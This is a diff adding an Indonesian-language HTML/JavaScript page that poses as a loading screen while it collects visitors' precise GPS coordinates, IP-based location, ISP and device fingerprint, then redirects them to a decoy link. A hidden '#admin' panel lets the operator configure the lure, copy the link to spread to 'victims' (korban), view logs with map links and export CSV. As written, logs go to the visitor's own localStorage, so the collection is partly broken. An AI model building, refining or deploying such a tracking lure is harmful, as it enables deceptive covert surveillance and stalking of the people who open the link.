@@ -1,0 +1,1102 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading...</title>
+<style>
+  :root {
+    --bg: #0a0a0f;
+    --surface: #111118;
+    --border: #1e1e2e;
+    --accent: #6c63ff;
+    --accent2: #ff6584;
+    --text: #e2e2f0;
+    --muted: #5a5a7a;
+    --green: #00d68f;
+    --red: #ff4757;
+    --font: 'Segoe UI', system-ui, -apple-system, sans-serif;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--font);
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+  }
+
+  /* ── ADMIN PANEL ── */
+  #admin-panel {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: var(--bg);
+    z-index: 9999;
+    overflow-y: auto;
+  }
+
+  #admin-panel.visible { display: block; }
+
+  .admin-header {
+    background: var(--surface);
+    border-bottom: 1px solid var(--border);
+    padding: 18px 28px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    position: sticky;
+    top: 0;
+    z-index: 10;
+  }
+
+  .admin-header h1 {
+    font-size: 15px;
+    font-weight: 600;
+    color: var(--accent);
+    letter-spacing: 0.04em;
+  }
+
+  .dot {
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    background: var(--accent);
+    animation: pulse 2s ease-in-out infinite;
+  }
+
+  @keyframes pulse {
+    0%,100% { opacity: 1; }
+    50% { opacity: 0.3; }
+  }
+
+  .admin-body {
+    padding: 28px;
+    max-width: 760px;
+    margin: 0 auto;
+    display: flex;
+    flex-direction: column;
+    gap: 24px;
+  }
+
+  .card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    overflow: hidden;
+  }
+
+  .card-header {
+    padding: 14px 20px;
+    border-bottom: 1px solid var(--border);
+    font-size: 11px;
+    font-weight: 600;
+    color: var(--muted);
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+  }
+
+  .card-body { padding: 20px; }
+
+  .field-row {
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+    margin-bottom: 16px;
+  }
+
+  .field-row:last-child { margin-bottom: 0; }
+
+  label {
+    font-size: 12px;
+    color: var(--muted);
+    font-weight: 500;
+  }
+
+  input[type="text"], input[type="url"], select {
+    width: 100%;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 10px 14px;
+    color: var(--text);
+    font-size: 13px;
+    font-family: var(--font);
+    transition: border-color 0.2s;
+    outline: none;
+  }
+
+  input:focus, select:focus {
+    border-color: var(--accent);
+  }
+
+  .toggle-row {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 10px 0;
+  }
+
+  .toggle-label {
+    font-size: 13px;
+    color: var(--text);
+  }
+
+  .toggle-sub {
+    font-size: 11px;
+    color: var(--muted);
+    margin-top: 2px;
+  }
+
+  .toggle {
+    position: relative;
+    width: 42px;
+    height: 24px;
+    flex-shrink: 0;
+  }
+
+  .toggle input { display: none; }
+
+  .toggle-slider {
+    position: absolute;
+    inset: 0;
+    background: var(--border);
+    border-radius: 24px;
+    cursor: pointer;
+    transition: background 0.2s;
+  }
+
+  .toggle-slider::after {
+    content: '';
+    position: absolute;
+    width: 18px; height: 18px;
+    border-radius: 50%;
+    background: var(--muted);
+    top: 3px; left: 3px;
+    transition: all 0.2s;
+  }
+
+  .toggle input:checked + .toggle-slider {
+    background: var(--accent);
+  }
+
+  .toggle input:checked + .toggle-slider::after {
+    transform: translateX(18px);
+    background: #fff;
+  }
+
+  .btn {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    padding: 10px 18px;
+    border-radius: 8px;
+    font-size: 13px;
+    font-weight: 600;
+    cursor: pointer;
+    border: none;
+    transition: all 0.15s;
+    font-family: var(--font);
+  }
+
+  .btn-primary {
+    background: var(--accent);
+    color: #fff;
+  }
+
+  .btn-primary:hover { background: #7c74ff; }
+
+  .btn-danger {
+    background: transparent;
+    color: var(--red);
+    border: 1px solid var(--red);
+  }
+
+  .btn-danger:hover {
+    background: var(--red);
+    color: #fff;
+  }
+
+  .btn-sm {
+    padding: 6px 12px;
+    font-size: 11px;
+  }
+
+  .link-display {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 12px 16px;
+    font-size: 12px;
+    color: var(--muted);
+    word-break: break-all;
+    font-family: 'Courier New', monospace;
+  }
+
+  .link-display span {
+    color: var(--accent);
+  }
+
+  .copy-btn {
+    margin-top: 10px;
+    background: transparent;
+    border: 1px solid var(--border);
+    color: var(--text);
+    padding: 7px 14px;
+    border-radius: 6px;
+    font-size: 12px;
+    cursor: pointer;
+    font-family: var(--font);
+    transition: all 0.15s;
+  }
+
+  .copy-btn:hover { border-color: var(--accent); color: var(--accent); }
+
+  /* ── LOGS TABLE ── */
+  .log-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 12px;
+  }
+
+  .log-table th {
+    text-align: left;
+    padding: 8px 12px;
+    color: var(--muted);
+    font-weight: 600;
+    border-bottom: 1px solid var(--border);
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: 0.06em;
+  }
+
+  .log-table td {
+    padding: 10px 12px;
+    border-bottom: 1px solid rgba(30,30,46,0.5);
+    vertical-align: top;
+  }
+
+  .log-table tr:last-child td { border-bottom: none; }
+
+  .log-table tr:hover td { background: rgba(108,99,255,0.04); }
+
+  .coord-val {
+    font-family: 'Courier New', monospace;
+    color: var(--green);
+    font-size: 11px;
+  }
+
+  .acc-badge {
+    display: inline-block;
+    padding: 2px 7px;
+    border-radius: 20px;
+    font-size: 10px;
+    font-weight: 600;
+  }
+
+  .acc-high { background: rgba(0,214,143,0.12); color: var(--green); }
+  .acc-low  { background: rgba(255,71,87,0.12); color: var(--red); }
+
+  .empty-state {
+    text-align: center;
+    padding: 40px 20px;
+    color: var(--muted);
+    font-size: 13px;
+  }
+
+  .action-bar {
+    display: flex;
+    gap: 10px;
+    align-items: center;
+    flex-wrap: wrap;
+  }
+
+  .status-indicator {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 12px;
+    color: var(--muted);
+  }
+
+  .status-dot {
+    width: 6px; height: 6px;
+    border-radius: 50%;
+  }
+
+  .status-dot.active { background: var(--green); }
+  .status-dot.inactive { background: var(--muted); }
+
+  /* ── MAP LINK ── */
+  .map-link {
+    color: var(--accent);
+    text-decoration: none;
+    font-size: 11px;
+  }
+
+  .map-link:hover { text-decoration: underline; }
+
+  /* ── VICTIM PAGE ── */
+  #victim-page {
+    display: flex;
+    flex: 1;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    position: relative;
+    overflow: hidden;
+  }
+
+  #victim-page.hidden { display: none; }
+
+  .victim-bg {
+    position: absolute;
+    inset: 0;
+    background: radial-gradient(ellipse at 30% 50%, rgba(108,99,255,0.06) 0%, transparent 60%),
+                radial-gradient(ellipse at 70% 80%, rgba(255,101,132,0.04) 0%, transparent 50%),
+                var(--bg);
+  }
+
+  .loading-card {
+    position: relative;
+    z-index: 1;
+    text-align: center;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 20px;
+    padding: 20px;
+  }
+
+  .spinner-wrap {
+    position: relative;
+    width: 64px;
+    height: 64px;
+  }
+
+  .spinner-ring {
+    position: absolute;
+    inset: 0;
+    border-radius: 50%;
+    border: 2px solid transparent;
+    animation: spin 1.2s linear infinite;
+  }
+
+  .spinner-ring.r1 {
+    border-top-color: var(--accent);
+    animation-duration: 1.2s;
+  }
+
+  .spinner-ring.r2 {
+    inset: 8px;
+    border-right-color: var(--accent2);
+    animation-duration: 0.9s;
+    animation-direction: reverse;
+  }
+
+  .spinner-ring.r3 {
+    inset: 18px;
+    border-bottom-color: rgba(108,99,255,0.4);
+    animation-duration: 1.6s;
+  }
+
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
+  .loading-title {
+    font-size: 15px;
+    font-weight: 600;
+    color: var(--text);
+  }
+
+  .loading-sub {
+    font-size: 12px;
+    color: var(--muted);
+    max-width: 220px;
+    line-height: 1.6;
+  }
+
+  .progress-bar {
+    width: 200px;
+    height: 2px;
+    background: var(--border);
+    border-radius: 2px;
+    overflow: hidden;
+  }
+
+  .progress-fill {
+    height: 100%;
+    background: linear-gradient(90deg, var(--accent), var(--accent2));
+    border-radius: 2px;
+    animation: progress 2.5s ease-in-out forwards;
+  }
+
+  @keyframes progress {
+    0% { width: 0%; }
+    40% { width: 55%; }
+    70% { width: 75%; }
+    100% { width: 95%; }
+  }
+
+  /* ── TOAST ── */
+  #toast {
+    position: fixed;
+    bottom: 24px;
+    left: 50%;
+    transform: translateX(-50%) translateY(60px);
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 10px 18px;
+    font-size: 13px;
+    color: var(--text);
+    z-index: 99999;
+    transition: transform 0.3s ease;
+    white-space: nowrap;
+  }
+
+  #toast.show { transform: translateX(-50%) translateY(0); }
+
+  /* ── SCROLLBAR ── */
+  ::-webkit-scrollbar { width: 6px; }
+  ::-webkit-scrollbar-track { background: transparent; }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+  ::-webkit-scrollbar-thumb:hover { background: var(--muted); }
+
+  /* ── RESPONSIVE ── */
+  @media (max-width: 600px) {
+    .admin-body { padding: 16px; }
+    .log-table { font-size: 11px; }
+    .log-table th, .log-table td { padding: 8px 8px; }
+  }
+</style>
+</head>
+<body>
+
+<!-- ══════════════════════════════════════
+     VICTIM PAGE (default view)
+══════════════════════════════════════ -->
+<div id="victim-page">
+  <div class="victim-bg"></div>
+  <div class="loading-card">
+    <div class="spinner-wrap">
+      <div class="spinner-ring r1"></div>
+      <div class="spinner-ring r2"></div>
+      <div class="spinner-ring r3"></div>
+    </div>
+    <div>
+      <div class="loading-title" id="loading-title">Memuat konten...</div>
+      <div class="loading-sub" id="loading-sub">Mohon tunggu sebentar</div>
+    </div>
+    <div class="progress-bar">
+      <div class="progress-fill"></div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     ADMIN PANEL
+══════════════════════════════════════ -->
+<div id="admin-panel">
+  <div class="admin-header">
+    <div class="dot"></div>
+    <h1>Location Panel</h1>
+    <div style="margin-left:auto; display:flex; gap:10px; align-items:center;">
+      <div class="status-indicator" id="geo-status">
+        <div class="status-dot inactive" id="geo-dot"></div>
+        <span id="geo-label">Geo: Standby</span>
+      </div>
+      <button class="btn btn-sm" style="background:var(--border);color:var(--text);border:none;" onclick="exitAdmin()">
+        ✕ Keluar
+      </button>
+    </div>
+  </div>
+
+  <div class="admin-body">
+
+    <!-- CONFIG -->
+    <div class="card">
+      <div class="card-header">Konfigurasi Link</div>
+      <div class="card-body">
+        <div class="field-row">
+          <label>Target URL (redirect tujuan)</label>
+          <input type="url" id="target-url" placeholder="https://vt.tiktok.com/xxxxx atau link apapun"
+                 value="" oninput="updatePreview()">
+        </div>
+        <div class="field-row">
+          <label>Teks loading (yang dilihat korban)</label>
+          <input type="text" id="loading-text" placeholder="Memuat konten..."
+                 value="Memuat konten...">
+        </div>
+        <div class="field-row">
+          <label>Sub-teks loading</label>
+          <input type="text" id="loading-subtext" placeholder="Mohon tunggu sebentar"
+                 value="Mohon tunggu sebentar">
+        </div>
+        <div class="field-row">
+          <label>Delay redirect (detik)</label>
+          <input type="text" id="delay-sec" placeholder="3" value="3" style="width:80px">
+        </div>
+
+        <div style="border-top:1px solid var(--border); margin: 16px 0 16px;"></div>
+
+        <div class="toggle-row">
+          <div>
+            <div class="toggle-label">Minta geolokasi</div>
+            <div class="toggle-sub">Browser akan prompt izin lokasi</div>
+          </div>
+          <label class="toggle">
+            <input type="checkbox" id="toggle-geo" checked>
+            <span class="toggle-slider"></span>
+          </label>
+        </div>
+
+        <div class="toggle-row">
+          <div>
+            <div class="toggle-label">High accuracy GPS</div>
+            <div class="toggle-sub">enableHighAccuracy — lebih akurat, lebih lambat</div>
+          </div>
+          <label class="toggle">
+            <input type="checkbox" id="toggle-high-acc" checked>
+            <span class="toggle-slider"></span>
+          </label>
+        </div>
+
+        <div class="toggle-row">
+          <div>
+            <div class="toggle-label">Tetap redirect walau lokasi gagal</div>
+            <div class="toggle-sub">Jika korban tolak/timeout, tetap diarahkan</div>
+          </div>
+          <label class="toggle">
+            <input type="checkbox" id="toggle-force-redirect" checked>
+            <span class="toggle-slider"></span>
+          </label>
+        </div>
+
+        <div style="margin-top:20px;">
+          <button class="btn btn-primary" onclick="saveConfig()">Simpan & Generate Link</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- GENERATED LINK -->
+    <div class="card" id="link-card" style="display:none">
+      <div class="card-header">Link yang Disebarkan</div>
+      <div class="card-body">
+        <div class="link-display" id="generated-link-display">—</div>
+        <button class="copy-btn" onclick="copyLink()">Salin link</button>
+        <p style="font-size:11px;color:var(--muted);margin-top:12px;">
+          Sebarkan link ini. Saat dibuka, browser minta izin lokasi → data masuk ke log → redirect ke target.
+        </p>
+      </div>
+    </div>
+
+    <!-- LOG -->
+    <div class="card">
+      <div class="card-header" style="display:flex;align-items:center;justify-content:space-between;">
+        <span>Log Lokasi</span>
+        <div class="action-bar">
+          <span style="font-size:11px;color:var(--muted)" id="log-count">0 entri</span>
+          <button class="btn btn-sm btn-danger" onclick="clearLogs()">Hapus semua</button>
+          <button class="btn btn-sm" style="background:var(--accent);color:#fff;border:none;" onclick="exportCSV()">Export CSV</button>
+        </div>
+      </div>
+      <div class="card-body" style="padding:0; overflow-x:auto;">
+        <div id="log-container">
+          <div class="empty-state">Belum ada data. Tunggu korban buka link.</div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- TOAST -->
+<div id="toast"></div>
+
+<script>
+// ══════════════════════════════════════
+//  CONFIG & STATE
+// ══════════════════════════════════════
+const ADMIN_CODE = '#admin';        // buka panel dengan tambah #admin di URL
+const STORAGE_KEY = 'lp_config_v1';
+const LOG_KEY     = 'lp_logs_v1';
+
+let config = {
+  targetUrl: '',
+  loadingText: 'Memuat konten...',
+  loadingSub: 'Mohon tunggu sebentar',
+  delaySec: 3,
+  geoEnabled: true,
+  highAccuracy: true,
+  forceRedirect: true,
+};
+
+let logs = [];
+
+// ══════════════════════════════════════
+//  INIT
+// ══════════════════════════════════════
+(function init() {
+  loadConfig();
+  loadLogs();
+
+  // cek apakah admin mode
+  if (window.location.hash === ADMIN_CODE) {
+    showAdmin();
+    return;
+  }
+
+  // mode victim
+  runVictimFlow();
+})();
+
+// ══════════════════════════════════════
+//  VICTIM FLOW
+// ══════════════════════════════════════
+async function getIPData() {
+  try {
+    const r = await fetch('https://ipapi.co/json/');
+    if (!r.ok) return {};
+    const d = await r.json();
+    return {
+      ip:            d.ip           || null,
+      ipCity:        d.city         || null,
+      ipRegion:      d.region       || null,
+      ipCountry:     d.country_name || null,
+      ipCountryCode: d.country      || null,
+      ipISP:         d.org          || null,
+      ipLat:         d.latitude     || null,
+      ipLng:         d.longitude    || null,
+      ipTimezone:    d.timezone     || null,
+      ipPostal:      d.postal       || null,
+    };
+  } catch { return {}; }
+}
+
+function buildDeviceData() {
+  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  return {
+    ua:       navigator.userAgent,
+    screen:   `${screen.width}x${screen.height}`,
+    lang:     navigator.language,
+    tz:       Intl.DateTimeFormat().resolvedOptions().timeZone,
+    ram:      navigator.deviceMemory ? `${navigator.deviceMemory}GB` : null,
+    cpu:      navigator.hardwareConcurrency || null,
+    touch:    navigator.maxTouchPoints > 0,
+    connType: conn ? (conn.effectiveType || conn.type || null) : null,
+    connDown: conn ? conn.downlink || null : null,
+    referrer: document.referrer || null,
+  };
+}
+
+async function runVictimFlow() {
+  document.getElementById('loading-title').textContent = config.loadingText || 'Memuat konten...';
+  document.getElementById('loading-sub').textContent   = config.loadingSub  || 'Mohon tunggu sebentar';
+
+  const delay = (config.delaySec || 3) * 1000;
+
+  // IP lookup tanpa izin — jalan paralel
+  const ipPromise = getIPData();
+  const deviceData = buildDeviceData();
+
+  if (!config.geoEnabled) {
+    const ipData = await ipPromise;
+    saveLog({ ts: new Date().toISOString(), ...deviceData, ...ipData });
+    setTimeout(() => doRedirect(), delay);
+    return;
+  }
+
+  if (!navigator.geolocation) {
+    const ipData = await ipPromise;
+    saveLog({ ts: new Date().toISOString(), error: 'Geolocation not supported', ...deviceData, ...ipData });
+    setTimeout(() => doRedirect(), delay);
+    return;
+  }
+
+  const geoOptions = {
+    enableHighAccuracy: config.highAccuracy,
+    timeout: 8000,
+    maximumAge: 0,
+  };
+
+  let redirectTriggered = false;
+
+  navigator.geolocation.getCurrentPosition(
+    async (pos) => {
+      const ipData = await ipPromise;
+      const entry = {
+        ts:       new Date().toISOString(),
+        lat:      pos.coords.latitude,
+        lng:      pos.coords.longitude,
+        accuracy: pos.coords.accuracy,
+        altitude: pos.coords.altitude,
+        ...deviceData,
+        ...ipData,
+      };
+      saveLog(entry);
+
+      if (!redirectTriggered) {
+        redirectTriggered = true;
+        const remaining = delay - 500;
+        setTimeout(() => doRedirect(), remaining > 0 ? remaining : 300);
+      }
+    },
+    async (err) => {
+      const ipData = await ipPromise;
+      const entry = {
+        ts:    new Date().toISOString(),
+        error: err.message,
+        code:  err.code,
+        ...deviceData,
+        ...ipData,
+      };
+      saveLog(entry);
+
+      if (!redirectTriggered && config.forceRedirect) {
+        redirectTriggered = true;
+        setTimeout(() => doRedirect(), 500);
+      }
+    },
+    geoOptions
+  );
+
+  setTimeout(() => {
+    if (!redirectTriggered && config.forceRedirect) {
+      redirectTriggered = true;
+      doRedirect();
+    }
+  }, delay + 1000);
+}
+
+function doRedirect() {
+  const url = config.targetUrl;
+  if (!url || url.trim() === '') {
+    // tidak ada target — diam saja atau tunjukkan error
+    document.getElementById('loading-title').textContent = 'Siap.';
+    document.getElementById('loading-sub').textContent   = 'Tidak ada redirect yang dikonfigurasi.';
+    return;
+  }
+  window.location.href = url;
+}
+
+// ══════════════════════════════════════
+//  ADMIN
+// ══════════════════════════════════════
+function showAdmin() {
+  document.getElementById('victim-page').classList.add('hidden');
+  document.getElementById('admin-panel').classList.add('visible');
+  populateForm();
+  renderLogs();
+  updatePreview();
+
+  // real-time storage listener (multi-tab)
+  window.addEventListener('storage', (e) => {
+    if (e.key === LOG_KEY) {
+      loadLogs();
+      renderLogs();
+      flashGeo();
+    }
+  });
+}
+
+function exitAdmin() {
+  window.location.hash = '';
+  window.location.reload();
+}
+
+function populateForm() {
+  document.getElementById('target-url').value       = config.targetUrl      || '';
+  document.getElementById('loading-text').value     = config.loadingText    || '';
+  document.getElementById('loading-subtext').value  = config.loadingSub     || '';
+  document.getElementById('delay-sec').value        = config.delaySec       || 3;
+  document.getElementById('toggle-geo').checked     = config.geoEnabled     !== false;
+  document.getElementById('toggle-high-acc').checked= config.highAccuracy   !== false;
+  document.getElementById('toggle-force-redirect').checked = config.forceRedirect !== false;
+}
+
+function saveConfig() {
+  config.targetUrl     = document.getElementById('target-url').value.trim();
+  config.loadingText   = document.getElementById('loading-text').value.trim()    || 'Memuat konten...';
+  config.loadingSub    = document.getElementById('loading-subtext').value.trim() || 'Mohon tunggu sebentar';
+  config.delaySec      = parseFloat(document.getElementById('delay-sec').value)  || 3;
+  config.geoEnabled    = document.getElementById('toggle-geo').checked;
+  config.highAccuracy  = document.getElementById('toggle-high-acc').checked;
+  config.forceRedirect = document.getElementById('toggle-force-redirect').checked;
+
+  localStorage.setItem(STORAGE_KEY, JSON.stringify(config));
+  updatePreview();
+  showToast('Konfigurasi disimpan');
+}
+
+function updatePreview() {
+  const base = window.location.href.split('#')[0];
+  const card = document.getElementById('link-card');
+  const disp = document.getElementById('generated-link-display');
+
+  card.style.display = 'block';
+  disp.innerHTML = `<span>${base}</span>`;
+}
+
+function copyLink() {
+  const base = window.location.href.split('#')[0];
+  navigator.clipboard.writeText(base).then(() => showToast('Link disalin!')).catch(() => {
+    // fallback
+    const ta = document.createElement('textarea');
+    ta.value = base;
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand('copy');
+    document.body.removeChild(ta);
+    showToast('Link disalin!');
+  });
+}
+
+// ══════════════════════════════════════
+//  LOGS
+// ══════════════════════════════════════
+function saveLog(entry) {
+  loadLogs(); // refresh dulu biar tidak overwrite dari tab lain
+  logs.push(entry);
+  // simpan max 200 entri
+  if (logs.length > 200) logs = logs.slice(-200);
+  localStorage.setItem(LOG_KEY, JSON.stringify(logs));
+}
+
+function loadLogs() {
+  try {
+    const raw = localStorage.getItem(LOG_KEY);
+    logs = raw ? JSON.parse(raw) : [];
+  } catch { logs = []; }
+}
+
+function clearLogs() {
+  if (!confirm('Hapus semua log?')) return;
+  logs = [];
+  localStorage.removeItem(LOG_KEY);
+  renderLogs();
+  showToast('Log dihapus');
+}
+
+function loadConfig() {
+  try {
+    const raw = localStorage.getItem(STORAGE_KEY);
+    if (raw) Object.assign(config, JSON.parse(raw));
+  } catch {}
+}
+
+function renderLogs() {
+  const container = document.getElementById('log-container');
+  const count = document.getElementById('log-count');
+
+  if (!logs.length) {
+    container.innerHTML = '<div class="empty-state">Belum ada data. Tunggu korban buka link.</div>';
+    count.textContent = '0 entri';
+    return;
+  }
+
+  count.textContent = `${logs.length} entri`;
+
+  // terbalik — terbaru di atas
+  const sorted = [...logs].reverse();
+
+  let html = `<table class="log-table">
+    <thead>
+      <tr>
+        <th>#</th>
+        <th>Waktu</th>
+        <th>GPS</th>
+        <th>Akurasi</th>
+        <th>IP / Lokasi IP</th>
+        <th>ISP</th>
+        <th>Timezone</th>
+        <th>Device</th>
+        <th>Hardware</th>
+        <th>Koneksi</th>
+        <th>Status</th>
+      </tr>
+    </thead>
+    <tbody>`;
+
+  sorted.forEach((entry, i) => {
+    const num  = logs.length - i;
+    const time = entry.ts ? new Date(entry.ts).toLocaleString('id-ID') : '—';
+
+    // clean timezone: "Asia/Jakarta" → "Asia / Jakarta"
+    const tzRaw   = entry.tz || '—';
+    const tzClean = tzRaw.replace('_', ' ').replace('/', ' / ');
+    const tzCity  = tzRaw.includes('/') ? tzRaw.split('/').pop().replace('_',' ') : tzRaw;
+
+    // koneksi label
+    const connLabel = entry.connType
+      ? `${entry.connType.toUpperCase()}${entry.connDown ? ` · ${entry.connDown}Mbps` : ''}`
+      : '—';
+
+    if (entry.error) {
+      const errLabel = entry.code === 1 ? 'Ditolak' :
+                       entry.code === 2 ? 'Tdk tersedia' :
+                       entry.code === 3 ? 'Timeout' : 'Error';
+      const ipLocErr = [entry.ipCity, entry.ipRegion, entry.ipCountry].filter(Boolean).join(', ') || '—';
+      html += `<tr>
+        <td style="color:var(--muted)">${num}</td>
+        <td style="font-size:11px">${time}</td>
+        <td style="color:var(--muted)">—</td>
+        <td><span class="acc-badge acc-low">${errLabel}</span></td>
+        <td style="font-size:11px">
+          ${entry.ip ? `<span class="coord-val">${entry.ip}</span><br>` : ''}
+          <span style="color:var(--text)">${ipLocErr}</span>
+          ${entry.ipLat ? `<br><a href="https://www.google.com/maps?q=${entry.ipLat},${entry.ipLng}" target="_blank" class="map-link">↗ Maps (IP)</a>` : ''}
+        </td>
+        <td style="font-size:11px;color:var(--muted)">${entry.ipISP || '—'}</td>
+        <td style="font-size:11px">
+          <span style="color:var(--text)">${tzCity}</span><br>
+          <span style="color:var(--muted)">${entry.lang || '—'}</span>
+        </td>
+        <td style="font-size:11px;color:var(--muted)" title="${escHtml(entry.ua||'')}">
+          ${entry.screen || '—'}<br>${shortUA(entry.ua)}
+        </td>
+        <td style="font-size:11px;color:var(--muted)">
+          ${entry.ram ? `RAM ${entry.ram}` : '—'}<br>
+          ${entry.cpu ? `${entry.cpu} core` : ''}
+          ${entry.touch !== undefined ? ` · ${entry.touch ? '👆' : '🖱️'}` : ''}
+        </td>
+        <td style="font-size:11px;color:var(--muted)">${connLabel}</td>
+        <td><span class="acc-badge acc-low">Geo Gagal</span></td>
+      </tr>`;
+    } else {
+      const lat      = entry.lat?.toFixed(6) ?? '—';
+      const lng      = entry.lng?.toFixed(6) ?? '—';
+      const acc      = entry.accuracy ? `±${Math.round(entry.accuracy)}m` : '—';
+      const accClass = (entry.accuracy && entry.accuracy < 50) ? 'acc-high' : 'acc-low';
+      const mapUrl   = entry.lat ? `https://www.google.com/maps?q=${entry.lat},${entry.lng}` : null;
+
+      const ipLoc = [entry.ipCity, entry.ipRegion, entry.ipCountry].filter(Boolean).join(', ') || '—';
+      html += `<tr>
+        <td style="color:var(--muted)">${num}</td>
+        <td style="font-size:11px">${time}</td>
+        <td>
+          <span class="coord-val">${lat},<br>${lng}</span><br>
+          ${mapUrl ? `<a href="${mapUrl}" target="_blank" class="map-link">↗ Maps (GPS)</a>` : ''}
+        </td>
+        <td><span class="acc-badge ${accClass}">${acc}</span></td>
+        <td style="font-size:11px">
+          ${entry.ip ? `<span class="coord-val">${entry.ip}</span><br>` : ''}
+          <span style="color:var(--text)">${ipLoc}</span>
+          ${entry.ipPostal ? `<span style="color:var(--muted)"> ${entry.ipPostal}</span>` : ''}
+          ${entry.ipLat ? `<br><a href="https://www.google.com/maps?q=${entry.ipLat},${entry.ipLng}" target="_blank" class="map-link">↗ Maps (IP)</a>` : ''}
+        </td>
+        <td style="font-size:11px;color:var(--muted)">${entry.ipISP || '—'}</td>
+        <td style="font-size:11px">
+          <span style="color:var(--text)">${tzCity}</span><br>
+          <span style="color:var(--muted)">${tzClean}</span><br>
+          <span style="color:var(--muted)">${entry.lang || '—'}</span>
+        </td>
+        <td style="font-size:11px" title="${escHtml(entry.ua||'')}">
+          <span style="color:var(--text)">${entry.screen || '—'}</span><br>
+          <span style="color:var(--muted)">${shortUA(entry.ua)}</span>
+        </td>
+        <td style="font-size:11px">
+          ${entry.ram ? `<span style="color:var(--green)">RAM ${entry.ram}</span><br>` : ''}
+          ${entry.cpu ? `<span style="color:var(--text)">${entry.cpu} core</span>` : ''}
+          ${entry.touch !== undefined ? `<br><span style="color:var(--muted)">${entry.touch ? '👆 Touch' : '🖱️ Non-touch'}</span>` : ''}
+        </td>
+        <td style="font-size:11px">
+          ${entry.connType ? `<span style="color:var(--text)">${entry.connType.toUpperCase()}</span>` : '—'}
+          ${entry.connDown ? `<br><span style="color:var(--muted)">${entry.connDown} Mbps</span>` : ''}
+        </td>
+        <td><span class="acc-badge acc-high">✓ GPS + IP</span></td>
+      </tr>`;
+    }
+  });
+
+  html += '</tbody></table>';
+  container.innerHTML = html;
+}
+
+function flashGeo() {
+  const dot   = document.getElementById('geo-dot');
+  const label = document.getElementById('geo-label');
+  dot.classList.remove('inactive');
+  dot.classList.add('active');
+  label.textContent = 'Geo: Aktif';
+  setTimeout(() => {
+    dot.classList.remove('active');
+    dot.classList.add('inactive');
+    label.textContent = 'Geo: Standby';
+  }, 3000);
+}
+
+// ══════════════════════════════════════
+//  EXPORT
+// ══════════════════════════════════════
+function exportCSV() {
+  if (!logs.length) { showToast('Tidak ada data'); return; }
+
+  const headers = ['No','Waktu','Latitude','Longitude','Akurasi(m)','Timezone','Lang','Screen','RAM','CPU','Touch','Koneksi','UserAgent','Status','Error'];
+  const rows = logs.map((e, i) => [
+    i + 1,
+    e.ts ? new Date(e.ts).toLocaleString('id-ID') : '',
+    e.lat ?? '',
+    e.lng ?? '',
+    e.accuracy ? Math.round(e.accuracy) : '',
+    e.tz ?? '',
+    e.lang ?? '',
+    e.screen ?? '',
+    e.ram ?? '',
+    e.cpu ?? '',
+    e.touch !== undefined ? (e.touch ? 'Touch' : 'Non-touch') : '',
+    e.connType ?? '',
+    e.connDown ? `${e.connDown} Mbps` : '',
+    (e.ua ?? '').replace(/"/g, '""'),
+    e.error ? 'Gagal' : 'Sukses',
+    e.error ?? '',
+  ]);
+
+  let csv = headers.join(',') + '\n';
+  rows.forEach(r => {
+    csv += r.map(v => `"${v}"`).join(',') + '\n';
+  });
+
+  const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
+  const url  = URL.createObjectURL(blob);
+  const a    = document.createElement('a');
+  a.href     = url;
+  a.download = `location_log_${Date.now()}.csv`;
+  a.click();
+  URL.revokeObjectURL(url);
+  showToast('CSV diexport');
+}
+
+// ══════════════════════════════════════
+//  UTILS
+// ══════════════════════════════════════
+function shortUA(ua) {
+  if (!ua) return '—';
+  if (/iPhone/.test(ua))  return 'iPhone';
+  if (/iPad/.test(ua))    return 'iPad';
+  if (/Android/.test(ua)) {
+    const m = ua.match(/Android[^;]*;\s*([^)]+)\)/);
+    return m ? m[1].trim().substring(0, 20) : 'Android';
+  }
+  if (/Windows/.test(ua)) return 'Windows PC';
+  if (/Mac/.test(ua))     return 'Mac';
+  if (/Linux/.test(ua))   return 'Linux';
+  return ua.substring(0, 20) + '…';
+}
+
+function escHtml(s) {
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+function showToast(msg) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.classList.add('show');
+  setTimeout(() => t.classList.remove('show'), 2000);
+}
+</script>
+</body>
+</html>
